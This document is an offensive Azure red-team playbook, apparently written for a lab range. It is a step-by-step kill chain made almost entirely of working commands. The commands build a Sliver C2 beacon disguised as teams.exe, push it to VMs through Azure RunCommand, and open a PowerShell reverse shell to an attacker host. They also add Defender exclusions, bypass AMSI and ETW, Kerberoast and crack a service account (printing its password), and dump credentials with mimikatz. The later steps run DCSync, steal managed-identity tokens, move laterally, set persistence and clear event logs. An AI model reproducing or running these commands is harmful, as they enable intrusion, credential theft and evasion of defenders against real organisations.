# Azure RunCommand + Sliver C2 — Proven Attack Path

Engagement-proven kill chain. Every command validated live. Follow in order.

```
Kali Setup (build Sliver, import profile, start listener)
   |
   v
Generate Harriet-wrapped implant (teams.exe)
   |
   v
RunCommand v2 --> drop teams.exe on httpserver (10.1.0.10) --> SYSTEM
   |
   v  (if Defender blocks)
   Fallback: nc reverse shell via RunCommand
   --> Add Defender exclusion path
   --> Re-drop Sliver implant
   |
   v
Beacon checks in --> interactive session
   |
   v
Domain enum: users, groups, SPNs, computers, port scan
   |
   v
Kerberoast svc.mssql --> crack offline --> GY2W*%m!P%0HK
   |
   v
mimikatz / LSA secrets --> confirm DA creds
   |
   v
WinRM lateral movement --> blueDBServer (10.1.0.100)
   |
   v
DB access, DC takeover via RunCommand, Entra Connect enum
```

### Environment

| Asset | IP |
|-------|-----|
| httpserver | blueHttpServer / 10.1.0.10 |
| DBServer | blueDBServer / 10.1.0.100 |
| Domain Controller | blueDC-01 / 10.1.0.5 |
| EntraConnect | blueEntraC-01 / 10.1.0.25 |
| FileServer | blueFileServer / 10.1.0.20 |
| Domain | contoso.range |
| Subscription | `5152d66b-be33-42c3-b579-d9f723849d41` |
| Resource Group | RGCORPSERVERS |

**Critical**: All VMs have NO outbound internet. RunCommand is the only way in.

---

## Step 1: Kali Setup

### 1a: Build Sliver

```bash
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver
bash setup.sh
```

This installs Go, MinGW, Harriet, builds Sliver, downloads tools (LSA Whisperer, impacket, pypykatz, netexec), and creates helper scripts.

### 1b: Start Server + Listener

```bash
cd ~/sliver
./start.sh
```

This auto-kills orphan processes, starts the daemon, creates operator config, imports the microsoft365 C2 profile (first run), starts mTLS on 8888, and drops you into the interactive console.

For HTTPS too:
```bash
./start.sh --domain cdn.yourdomain.com
```

### 1c: Install Armory Extensions

Inside the Sliver console:
```
armory install windows-credentials
armory install kerberos
armory install situational-awareness
armory install windows-pivot
armory install windows-bypass
armory install .net-pivot
armory install .net-recon
```

---

## Step 2: Generate Harriet-Wrapped Implant

```
# Generate beacon shellcode
generate beacon --mtls YOUR_C2_IP:8888 --os windows --arch amd64 \
  --format shellcode --evasion --c2profile microsoft365 \
  --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin

# Wrap with Harriet (DirectSyscalls = most evasive)
harriet --shellcode /tmp/beacon.bin --method directsyscall \
  --format exe --output /tmp/teams.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

You now have `/tmp/teams.exe` — AES-encrypted, code-signed Sliver beacon.

---

## Step 3: Get ARM Token

```bash
# Service Principal
curl -X POST "https://login.microsoftonline.com/TENANT/oauth2/token" \
  -d "grant_type=client_credentials&client_id=CLIENT_ID&client_secret=SECRET&resource=https://management.azure.com"

# Save the token
export TOKEN="eyJ0eX..."
export SUB="5152d66b-be33-42c3-b579-d9f723849d41"
export RG="RGCORPSERVERS"
```

---

## Step 4: Deploy Implant via RunCommand

### 4a: Try Direct Drop

```bash
# Base64 encode the implant
B64=$(base64 -w0 /tmp/teams.exe)

# Deploy via RunCommand v2
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/deploy?api-version=2023-07-01" \
  -d "{
    \"location\": \"eastus2\",
    \"properties\": {
      \"source\": {\"script\": \"\$b=[Convert]::FromBase64String('$B64');[IO.File]::WriteAllBytes('C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\teams.exe',\$b);Start-Process 'C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\teams.exe'\"},
      \"timeoutInSeconds\": 86400,
      \"asyncExecution\": true
    }
  }"

# Poll for result
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/deploy?\$expand=instanceView&api-version=2023-07-01" \
  | jq '.properties.instanceView'
```

Or use the helper script:
```bash
./deploy-runcommand.sh --token $TOKEN --sub $SUB --rg $RG --vm blueHttpServer --implant-url http://YOUR_C2/teams.exe
```

### 4b: If Defender Blocks — Fallback NC Shell

If the implant gets caught by Defender, get a basic nc shell first:

```bash
# Start nc listener on Kali
nc -lvnp 4444
```

```bash
# Deploy nc reverse shell via RunCommand
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/nc-shell?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "powershell -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('"'"'YOUR_C2_IP'"'"',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'"'"'PS> '"'"';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\""},
      "timeoutInSeconds": 86400,
      "asyncExecution": true
    }
  }'
```

### 4c: Add Defender Exclusion + Re-Drop Sliver

From the nc shell:
```powershell
# Add exclusion for our implant path
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network"
Add-MpPreference -ExclusionProcess "teams.exe"

# Verify exclusion took
Get-MpPreference | Select -ExpandProperty ExclusionPath

# Now drop the Sliver implant (base64 decode or download)
$b=[Convert]::FromBase64String("BASE64_HERE")
[IO.File]::WriteAllBytes("C:\ProgramData\Microsoft\Network\teams.exe",$b)
Start-Process "C:\ProgramData\Microsoft\Network\teams.exe"
```

Or add the exclusion via RunCommand directly:
```bash
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/av-exclude?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "Add-MpPreference -ExclusionPath \"C:\\ProgramData\\Microsoft\\Network\"\nAdd-MpPreference -ExclusionProcess \"teams.exe\""},
      "timeoutInSeconds": 30
    }
  }'
```

Then re-run Step 4a.

---

## Step 5: Verify Beacon + Go Interactive

```
# Check for beacon
beacons

# Use the beacon
use <BEACON_ID>

# Upgrade to interactive session (faster, but noisier)
interactive
```

From here everything runs through the Sliver session.

---

## Step 6: Domain Enumeration

```
# Bypass AMSI + ETW first
inject-amsi-bypass
inject-etw-bypass

# Who am I?
sa-whoami
getprivs

# Domain info
execute -o "nltest /dclist:contoso.range"
execute -o "nltest /domain_trusts"

# All domain users
sa-ldapsearch "(objectClass=user)" sAMAccountName,memberOf

# Domain Admins
sa-netgroup "Domain Admins" /domain

# Local admins on this box
sa-netlocalgroup Administrators

# All computers
sa-ldapsearch "(objectClass=computer)" cn,dNSHostName,operatingSystem

# Find SPNs (kerberoast targets)
sa-ldapsearch "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName

# AV/EDR check
sa-driversigs
sa-enum-filter-driver
```

### Port Scan Internal Network

```
portscan --host 10.1.0.100 --ports 445,5985,3389,1433,135
portscan --host 10.1.0.5 --ports 445,5985,3389,88,389
portscan --host 10.1.0.25 --ports 445,5985,3389
portscan --host 10.1.0.20 --ports 445,5985,3389
```

**Result**: Port 5985 (WinRM) open on blueDBServer. Found `svc.mssql` with SPN `MSSQLSvc/blueDBServer.contoso.range:1433`.

---

## Step 7: Kerberoast

```
# nanorobeus (BOF — fastest, in-process, no .NET)
nanorobeus kerberoast

# Or rubeus (.NET — more output control)
rubeus -- kerberoast /format:hashcat /nowrap

# Or bof-roast (BOF alternative)
bof-roast MSSQLSvc/blueDBServer.contoso.range:1433
```

Copy the hash.

---

## Step 8: Crack Offline

On Kali:
```bash
# Save the $krb5tgs$23$ hash to a file
echo '$krb5tgs$23$*svc.mssql$contoso.range$...' > hash.txt

# Crack with hashcat
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Or john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result**: `svc.mssql` password: `GY2W*%m!P%0HK`

---

## Step 9: Credential Dump — Confirm + Collect More

```
# mimikatz (reflectively loaded in-process)
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::sam
mimikatz lsadump::secrets

# Or nanodump (LSASS dump via syscalls — more evasive)
nanodump -- --write C:\Windows\Temp\debug.dmp --valid
download C:\Windows\Temp\debug.dmp
# On Kali: pypykatz lsa minidump debug.dmp

# Or sharpsecdump (remote SAM/LSA — no files on disk)
sharpsecdump -- -target=localhost

# Or hashdump (built-in Sliver — quick SAM)
hashdump

# LSA Whisperer (works with Credential Guard — Sliver execute-assembly)
execute-assembly --in-process /opt/tools/lsa-whisperer/build/lsa-whisperer.exe --msv credkey
```

**Result**: Confirmed `contoso\svc.mssql` = Domain Admin with password `GY2W*%m!P%0HK`.

---

## Step 10: Lateral Movement — WinRM to DBServer

### 10a: Test Access

```
execute -o powershell -c "Test-WSMan -ComputerName blueDBServer -ErrorAction SilentlyContinue"
```

### 10b: Execute Commands on DBServer

```
# Quick command via WinRM
execute -o powershell -c "Invoke-Command -ComputerName blueDBServer -Credential (New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'GY2W*%m!P%0HK' -AsPlainText -Force))) -ScriptBlock {whoami /all; hostname}"
```

**Result**: `contoso\svc.mssql` confirmed Domain Admin on DBServer.

### 10c: Deploy Pivot Implant on DBServer

```
# Generate TCP pivot implant (routes back through httpserver)
generate --tcp-pivot 10.1.0.10:8888 --os windows --arch amd64 --skip-symbols --name db-pivot --save /tmp/db-pivot.exe

# Start TCP pivot listener on httpserver
pivots tcp --bind 0.0.0.0:8888

# Upload + execute on DBServer via WinRM
execute -o powershell -c "$cred=New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'GY2W*%m!P%0HK' -AsPlainText -Force));$b=[IO.File]::ReadAllBytes('C:\Windows\Temp\db-pivot.exe');Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock {param($b)[IO.File]::WriteAllBytes('C:\Windows\Temp\svc-update.exe',$b);Start-Process 'C:\Windows\Temp\svc-update.exe'} -ArgumentList (,$b)"
```

### 10d: Verify Pivot

```
sessions
use <DB_SESSION_ID>
sa-whoami
```

**Result**: Two sessions — httpserver (direct) + DBServer (TCP pivot).

---

## Step 11: Post-Exploitation on DBServer

```
# SQL Server access
execute -o sqlcmd -S localhost -Q "SELECT name FROM sys.databases"
execute -o sqlcmd -S localhost -Q "SELECT * FROM sys.sql_logins"
execute -o sqlcmd -S localhost -Q "SELECT name,data_source FROM sys.servers WHERE is_linked=1"

# Dump creds on DBServer too
mimikatz sekurlsa::logonpasswords
hashdump

# Network recon from DBServer vantage point
portscan --host 10.1.0.5 --ports 445,5985,3389,88,389
portscan --host 10.1.0.20 --ports 445,5985,3389
```

---

## Step 12: DC Takeover via RunCommand

We have Contributor on the subscription, so RunCommand works on the DC directly:

```bash
# Full AD dump
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueDomainServer/runCommands/dc-recon?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "Import-Module ActiveDirectory\nGet-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | Format-Table -AutoSize\nGet-ADGroupMember \"Domain Admins\" | Select SamAccountName\nGet-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | Format-Table"},
      "timeoutInSeconds": 120
    }
  }'
```

### DCSync (if you have a session on DC)

```
mimikatz lsadump::dcsync /user:contoso\krbtgt
mimikatz lsadump::dcsync /user:contoso\Administrator
```

### Managed Identity Tokens

```bash
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueDomainServer/runCommands/mi-token?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "$r=Invoke-WebRequest -Uri \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com\" -Headers @{Metadata=\"true\"} -UseBasicParsing; $r.Content"},
      "timeoutInSeconds": 30
    }
  }'
```

### EntraConnect ADSync

```bash
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueEntraC-01/runCommands/adsync?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "Get-ADSyncConnector | Select Name,Type | Format-Table\nGet-ADSyncScheduler | Format-List"},
      "timeoutInSeconds": 60
    }
  }'
```

---

## Step 13: Persistence

```
# On httpserver
sharpersist -- -t schtask -c "C:\ProgramData\Microsoft\Network\teams.exe" -n "DiagCheck" -m add -o logon
sharpersist -- -t reg -c "C:\ProgramData\Microsoft\Network\teams.exe" -k "hklmrun" -v "DiagTrack" -m add

# On DBServer (remote BOF)
remote-schtaskscreate blueDBServer DiagCheck "C:\Windows\Temp\svc-update.exe"
```

---

## Step 14: Cleanup

```
# Remove persistence
execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
execute -o reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /f

# Remove implants
rm C:\ProgramData\Microsoft\Network\teams.exe
rm C:\Windows\Temp\svc-update.exe
rm C:\Windows\Temp\*.dmp

# Remove Defender exclusion
execute -o powershell -c "Remove-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'"

# Clear logs
execute -o "wevtutil cl Security"
execute -o "wevtutil cl System"
execute -o "wevtutil cl Microsoft-Windows-PowerShell/Operational"

# Delete RunCommands from Azure
for CMD in deploy nc-shell av-exclude dc-recon mi-token adsync; do
  curl -X DELETE -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/$CMD?api-version=2023-07-01"
done

# Kill beacons
rev2self
exit
```
